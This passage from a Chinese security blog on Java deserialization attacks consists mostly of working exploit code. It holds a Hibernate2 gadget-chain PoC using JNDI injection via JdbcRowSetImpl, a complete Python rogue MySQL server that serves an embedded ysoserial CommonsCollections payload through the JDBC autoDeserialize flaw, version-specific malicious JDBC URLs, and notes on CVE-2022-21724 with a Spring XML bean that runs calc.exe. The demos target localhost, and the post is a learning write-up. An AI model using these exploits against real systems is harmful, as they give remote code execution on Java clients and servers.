static TemplatesImpl getTemplateImpl() throws Exception&#123;        ClassLoader classLoader = ClassLoader.getSystemClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        Class&lt;?&gt; c = Class.forName(&quot;java.lang.ClassLoader&quot;);        Method m = c.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);        m.setAccessible(true);        Class&lt;?&gt; c1 = (Class&lt;?&gt;) m.invoke(classLoader,bytes,0,bytes.length);        TemplatesImpl templates = new TemplatesImpl();        Class&lt;?&gt; templatesClass = templates.getClass();        Field _classField = templatesClass.getDeclaredField(&quot;_class&quot;);        _classField.setAccessible(true);        _classField.set(templates,new Class[]&#123;c1&#125;);        Field _nameField = templatesClass.getDeclaredField(&quot;_name&quot;);        _nameField.setAccessible(true);        _nameField.set(templates,&quot;666&quot;);        Field _transletIndexField = templatesClass.getDeclaredField(&quot;_transletIndex&quot;);        _transletIndexField.setAccessible(true);        _transletIndexField.set(templates,0);        Field _tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);        _tfactoryField.setAccessible(true);        _tfactoryField.set(templates,new TransformerFactoryImpl());        return templates;    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;

hibernate2依然看一下yso里面提供的链子
/** * javax.naming.InitialContext.InitialContext.lookup() * com.sun.rowset.JdbcRowSetImpl.connect() * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() */

从上面的链子可知大部分和Hibernate1的差不多，只需要改一下getter数组的值就可以了
这里利用的是jndi注入漏洞，需要前面在fastjson中提到的JdbcRowSetImpl
之前由于在fastjson中对于getter调用的条件比较严格，所以并没有用上这个getter方法，但是这一次的hiberate链中可以实现任意getter调用

poc只需要稍微修改一手，如下
package org.example;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import javax.sql.rowset.BaseRowSet;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class);        setField(componentType,&quot;propertySpan&quot;,2);        PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class);        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        Class c0 = BaseRowSet.class;        Field dataSourceField = c0.getDeclaredField(&quot;dataSource&quot;);        dataSourceField.setAccessible(true);        dataSourceField.set(jdbcRowSet,&quot;ldap://127.0.0.1:10389/cn=test,dc=example,dc=com&quot;);        Class&lt;?&gt; c = AbstractComponentTuplizer.class;        Field field = c.getDeclaredField(&quot;getters&quot;);        field.setAccessible(true);        field.set(pojoComponentTuplizer,new Getter[]&#123;new GetterMethodImpl(Object.class,&quot;qwq&quot;, JdbcRowSetImpl.class.getDeclaredMethod(&quot;getDatabaseMetaData&quot;))&#125;);        setField(componentType,&quot;componentTuplizer&quot;,pojoComponentTuplizer);        hashMap.put(1,1);        TypedValue typedValue = new TypedValue(componentType,jdbcRowSet);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,typedValue);            &#125;        &#125;        byte[] bytes = ser(hashMap);        System.out.println(Base64.getEncoder().encodeToString(bytes));        unser(bytes);    &#125;    public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return constructor1.newInstance();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static byte[] ser(Object o) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(o);        return byteArrayOutputStream.toByteArray();    &#125;    public static Object unser(byte[] bytes) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        return objectInputStream.readObject();    &#125;&#125;





]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之JDBC</title>
    <url>/2025/04/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJDBC/</url>
    <content><![CDATA[引用WebDog必学的JDBC反序列化
JDBC反序列化漏洞分析
小白看得懂的MySQL JDBC 反序列化漏洞分析
Java安全之JDBC Attacks学习记录
JDBC简介BC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现
原理分析简单demo首先我们先在maven引入依赖
&lt;dependency&gt;&lt;groupId&gt;mysql&lt;/groupId&gt;&lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;version&gt;8.0.19&lt;/version&gt;&lt;/dependency&gt;

我们试着用jdbc来查询一下我们自己本机上的表
package org.example;import java.sql.*;//导入API所需包public class Main &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;//JDBC驱动程序        String driver = &quot;com.mysql.cj.jdbc.Driver&quot;;        //String Driver = &quot;com.mysql.jdbc.Driver&quot;; // mysql-connector-java 5//数据库连接URL以及相关配置        String url = &quot;jdbc:mysql://127.0.0.1:3306/admin?serverTimezone=UTC&amp;autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;//加载驱动类        Class.forName(driver);//通过 Drivermanager 类获取数据库连接的实例        Connection connection = DriverManager.getConnection(url,&quot;root&quot;,&quot;123456&quot;);//利用createStatement接口获取一个statement对象，用于执行sql语句        Statement statement = connection.createStatement();//执行sql语句，将结果保存在ResultSet对象中        ResultSet resultSet = statement.executeQuery(&quot;SELECT * FROM users&quot;);//将结果集输出出来        while (resultSet.next())&#123;            String username = resultSet.getString(&quot;name&quot;);            String password = resultSet.getString(&quot;age&quot;);            System.out.println(&quot; username:&quot;+username+&quot; password:&quot;+password);        &#125;//        System.out.println(connection);    &#125;&#125;

说一下数据库连接的一些配置吧

admin就是所需要连接的数据库名称
serverTimezone&#x3D;UTC 指定了数据库服务器的时区为协调世界时（UTC）没有正确的时间处理，运行是会报错的
autoDeserialize&#x3D;true 表明从数据库中检索数据会自动反序列化，这个设置很重要，设置为false就没法利用了
statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor 指定了一个Mysql的语句拦截器，用于在执行sql语句前处理特殊事件

查询结果如下

java序列化对象特征我们也简单写一个demo
package org.example;import java.io.*;public class Car implements Serializable &#123;    private String name;    public Car()&#123;        this.name =&quot;car&quot;;    &#125;    public static void main(String[] args) throws IOException, FileNotFoundException &#123;        Car car=new Car();        FileOutputStream fos =new FileOutputStream(&quot;output&quot;);        ObjectOutputStream oos =new ObjectOutputStream(fos);        oos.writeObject(car);        oos.close();    &#125;&#125;

输出output文件后，再用专门的软件进行查看该16进制文件


可以看出来序列化文件的前两个字节固定为-84和-19，这一点在后面有重大作用
readObject触发点这次就不跟着走一遍流程了，直接说重点，漏洞点在于com.mysql.cj.jdbc.result.ResultSetImpl.getObject()
public Object getObject(int columnIndex) throws SQLException &#123;        checkRowPos();        checkColumnBounds(columnIndex);        int columnIndexMinusOne = columnIndex - 1;        // we can&#x27;t completely rely on code below because primitives have default values for null (e.g. int-&gt;0)        if (this.thisRow.getNull(columnIndexMinusOne)) &#123;            return null;        &#125;        Field field = this.columnDefinition.getFields()[columnIndexMinusOne];        switch (field.getMysqlType()) &#123;            case BIT:                // TODO Field sets binary and blob flags if the length of BIT field is &gt; 1; is it needed at all?                if (field.isBinary() || field.isBlob()) &#123;                    byte[] data = getBytes(columnIndex);                    if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) &#123;                        Object obj = data;                        if ((data != null) &amp;&amp; (data.length &gt;= 2)) &#123;                            if ((data[0] == -84) &amp;&amp; (data[1] == -19)) &#123;                                // Serialized object?                                try &#123;                                    ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);                                    ObjectInputStream objIn = new ObjectInputStream(bytesIn);                                    obj = objIn.readObject();                                    objIn.close();                                    bytesIn.close();                                &#125; catch (ClassNotFoundException cnfe) &#123;                                    throw SQLError.createSQLException(Messages.getString(&quot;ResultSet.Class_not_found___91&quot;) + cnfe.toString()                                            + Messages.getString(&quot;ResultSet._while_reading_serialized_object_92&quot;), getExceptionInterceptor());                                &#125; catch (IOException ex) &#123;                                    obj = data; // not serialized?                                &#125;                            &#125; else &#123;                                return getString(columnIndex);                            &#125;                        &#125;                        return obj;                    &#125;                    return data;                &#125;                return field.isSingleBit() ? Boolean.valueOf(getBoolean(columnIndex)) : getBytes(columnIndex);                ......

关键点如下：
在进入反序列化之前先进行了一个判断if ((data[0] == -84) &amp;&amp; (data[1] == -19))
是不是特别的熟悉，就是上面着重提到的那两个数字
先判断是否为序列化对象，是的话才能够进入并调用readObject方法
查找getObject的用法
在com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()中调用了，跟进看看：

跟进ResultSetUtil.resultSetToMap(toPopulate, rs);，调用了getObject方法

很好，现在我们只需要搞清楚上面的toPopulate和rs究竟是什么就可以了
toPopulate是一个Map类型的数据
rs实际上是服务端执行SQL语句SHOW SESSION STATUS后返回的结果，那么这就让我们不由得联想恶意mysql服务端了，如果有这么一个evil mysql，可以控制rs的值，那么可能就可以触发反序列化链了

我们回到前面的getObject方法中，在判断是否是序列化对象之前还进行了一个判断，校验autoDeserialize的值是否为true，这也是JDBC URL中为啥要特地声明该值为true的原因

Mysql认证报文先写一手客户端代码
package org.example;import java.sql.*;public class Client &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;        String Driver = &quot;com.mysql.cj.jdbc.Driver&quot;;        String DB_URL = &quot;jdbc:mysql://127.0.0.1:3306/admin?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&amp;serverTimezone=GMT%2B8&quot;;        Class.forName(Driver);        Connection conn = DriverManager.getConnection(DB_URL,&quot;root&quot;,&quot;123456&quot;);    &#125;&#125;

然后要用wireshark进行抓包，因为是抓本地的包，所以过滤器要选择这个

过滤条件为tcp.port ==3306 &amp;&amp; mysql：

不难发现其实mysql也是有类似tcp一样的认证系统的，有Request和Response，简单的看一个Response OK包：

MYSQL Protocol就是认证报文了为0700000200000002000000，也就是说我们恶意服务端只需要将该数据返回给Request即可完成认证，再看看问候(greeting)报文：

直接发送原始数据即可，恶意服务端可以将这部分改为恶意payload，之后进行反序列化
ServerStatusDiffInterceptor链8.0.7-8.0.20上面讲的其实就是该链
所以我们继续顺着上面的思路走，需要准备一个恶意mysql服务端：
import socketimport binasciiimport osgreeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;response_ok_data=&quot;0700000200000002000000&quot;def receive_data(conn):    data = conn.recv(1024)    print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data))    return str(data).lower()def send_data(conn,data):    print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data))    conn.send(binascii.a2b_hex(data))def get_payload_content():    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  &quot;calc&quot; &gt; a     file= r&#x27;a&#x27;    if os.path.isfile(file):        with open(file, &#x27;rb&#x27;) as f:            payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;)        print(&quot;open successs&quot;)    else:        print(&quot;open false&quot;)        #calc        payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;    return payload_content# 主要逻辑def run():    while 1:        conn, addr = sk.accept()        print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1]))        # 1.先发送第一个 问候报文        send_data(conn,greeting_data)        while True:            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok            receive_data(conn)            send_data(conn,response_ok_data)            #其他过程            data=receive_data(conn)            #查询一些配置信息,其中会发送自己的 版本号            if &quot;session.auto_increment_increment&quot; in data:                _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;                send_data(conn,_payload)                data=receive_data(conn)            elif &quot;show warnings&quot; in data:                _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;                send_data(conn, _payload)                data = receive_data(conn)            if &quot;set names&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;set character_set_results&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;show session status&quot; in data:                mysql_data = &#x27;0100000102&#x27;                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                # 为什么我加了EOF Packet 就无法正常运行呢？？                //获取payload                payload_content=get_payload_content()                //计算payload长度                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)                payload_length_hex = payload_length[2:4] + payload_length[0:2]                //计算数据包长度                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]                mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex                mysql_data += str(payload_content)                mysql_data += &#x27;07000005fe000022000100&#x27;                send_data(conn, mysql_data)                data = receive_data(conn)            if &quot;show warnings&quot; in data:                payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;                send_data(conn, payload)            breakif __name__ == &#x27;__main__&#x27;:    HOST =&#x27;0.0.0.0&#x27;    PORT = 3309    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sk.bind((HOST, PORT))    sk.listen(1)    print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT))    run()

上面poc的编写中，除了show session status的响应包外，剩下的包都可以直接按流量包总的数据直接抄过来的
show session status响应包的编写刚开始觉得是不需要了解MYSQL私有协议的，结果我错了。如果要自己编写POC，还是要看得懂的。这里会简单分析一下。从流量中可以看出来show session status属于request Query 报文。对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）。我们上面看到的Response OK数据包就是OK packet。这一部分我们主要是用的是结果集这个数据包。这里给出官方例子结果集响应包的结构如图所示

上面的官方图说明了一个结果集响应包的结构。

数据段1：说明下面的结果集有多少列
数据段2：列的定义
数据段3： EOF 包
数据段4：行数据

数据段的结构也是相似的。 长度（3字节） 序号（1字节） 协议数据（不同协议，数据不同）

数据段1就可以写成01 00 00 01 02 前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列（因为尝试写一列无法正常运行）

数据段2列的定义就比较复杂了。拿我写好的数据直接分析吧1a000002036465660001630163016301630c3f00ffff0000fcffff000000
1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）02      //序号 因为是第二个数据字段03646566  // 这个就是def的意思00   //schema 协议因为不使用就用0001 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的01 63  //org_table  01表示1字节，63是数据0163    //name  0163   //org_name0c      filler  // length of the following fields 总是0x0c3f00   //characterset  字符编码 003f是binary ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。fffffc    //column_type 这一列数据类型  fc表示blob  9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。00          //decimals0000        //filler_2

我的POC没有写 EOF包，不知道为什么加上就无法复现成功。（希望有人解答）

数据字段4就是POC了。POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）

POC使用ysoserial 。 java -jar ysoserial [common7那个] &quot;calc&quot; &gt; a


有了上面的知识再去看POC就很简单了
客户端代码
import java.sql.*;public class Client &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;        String driver = &quot;com.mysql.cj.jdbc.Driver&quot;;        String DB_URL = &quot;jdbc:mysql://127.0.0.1:3309/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true&quot;;//8.x使用        Class.forName(driver);        Connection conn = DriverManager.getConnection(DB_URL);    &#125;&#125;

由于上面恶意mysql服务端用上的是cc链，所以要确保客户端代码处有添加cc依赖（笔者漏了这一点导致当初被卡了好久）

跟着调试一手

跟进getConnection方法

又调用了一个getConnection方法，继续跟进
一直往下走

跟进connect方法

继续跟进getInstance方法

初始化ConnectionImpl，参数hostInfo就是恶意mysql服务端的一些数据

跟进，前面大部分代码都是初始化以及赋值，进入initializeSafeQueryInterceptors();初始化请求监听器

再往下走到createNewIO方法

跟进去

跟进connectTryOnly方法，往下走到此处

跟进去，发现拦截器是我们在参数queryInterceptors指定的ServerStatusDiffInterceptor类

返回，继续往下走，继续初始化initializePropsFromServer();

跟进去，往下走
跟进handleAutoCommitDefaults();

调用setAutoCommit方法，跟进去，继续往下走

调用execSQL执行SQL语句，跟进，往下走

发送SQL请求数据包，跟进sendQueryString方法

跟进

调用invokeQueryInterceptorsPre方法，跟进

调用preProcess方法，其参数sql就是设置autocommit的值为true，跟进


跟进populateMapWithSessionStatusValues方法

熟悉吧，就是前面我们提到的漏洞点
调用ResultSetUtil.resultSetToMap(toPopulate, rs)，这里的rs就是恶意的SQL服务端返回的数据
然后就是调用getObject进行反序列化，这就是最开始分析的一条链子，这里的jdbc版本是8,低版本大致流程也是这样，只有少数异同点，但最后都是进入getObject方法触发反序列化
5.1.0-5.1.10String url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;;String username = &quot;yso_CommonsCollections4_calc&quot;;String password = &quot;&quot;;Class.forName(&quot;com.mysql.jdbc.Driver&quot;);conn = DriverManager.getConnection(url,username,password);String sql = &quot;select database()&quot;;PreparedStatement ps = conn.prepareStatement(sql);//执行查询操作，返回的是数据库结果集的数据表ResultSet resultSet = ps.executeQuery();

payload如上
5.1.11-5.x.xxString url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;;String username = &quot;yso_CommonsCollections4_calc&quot;;String password = &quot;&quot;;Class.forName(&quot;com.mysql.jdbc.Driver&quot;);conn = DriverManager.getConnection(url,username,password);

6.xString url = &quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;;String username = &quot;yso_CommonsCollections4_calc&quot;;String password = &quot;&quot;;Class.forName(&quot;com.mysql.jdbc.Driver&quot;);conn = DriverManager.getConnection(url,username,password);

8.20以后这以后进入populateMapWithSessionStatusValues后不会再调用getObject，因此直接GG
detectCustomCollations链详见：https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%89%E3%80%81detectCustomCollations%E9%93%BE
感觉利用范围不是很大，先旷，后面有用到再学。。。。。。
PostgreSQLpostgresql简单使用：https://www.runoob.com/postgresql/windows-install-postgresql.html

同理PostgreSQL的property也存在安全问题CVE-2022-21724
在 PostgreSQL 数据库的 jdbc 驱动程序中发现一个安全漏洞。当攻击者控制 jdbc url 或者属性时，使用 PostgreSQL 数据库的系统将受到攻击。 pgjdbc 根据通过 authenticationPluginClassName、sslhostnameverifier、socketFactory 、sslfactory、sslpasswordcallback 连接属性提供类名实例化插件实例。但是，驱动程序在实例化类之前没有验证类是否实现了预期的接口。这可能导致通过任意类加载远程代码执行。
影响范围：
　　9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25
　　42.3.0 &lt;&#x3D;PgJDBC &lt; 42.3.2
这里主要记录两个点

socketFactory &#x2F; socketFactoryArg 等property调用有参构造触发的RCE
loggerLevel &#x2F; loggerFile 日志功能写文件

所需依赖
&lt;dependencies&gt;    &lt;!-- PostgreSQL JDBC 驱动（漏洞版本） --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.postgresql&lt;/groupId&gt;        &lt;artifactId&gt;postgresql&lt;/artifactId&gt;        &lt;version&gt;42.3.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- Spring 上下文（用于解析恶意 XML） --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework&lt;/groupId&gt;        &lt;artifactId&gt;spring-context&lt;/artifactId&gt;        &lt;version&gt;5.3.16&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;

socketFactory&#x2F;socketFactoryArg恶意xml文件，利用了 Spring 框架的依赖注入机制来执行 Windows 系统命令（弹出计算器 calc.exe）
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!-- Windows 环境下调用 calc.exe --&gt;    &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;            &lt;list&gt;                &lt;value&gt;cmd&lt;/value&gt;                 &lt;value&gt;/c&lt;/value&gt;                &lt;value&gt;calc.exe&lt;/value&gt;             &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;

测试代码
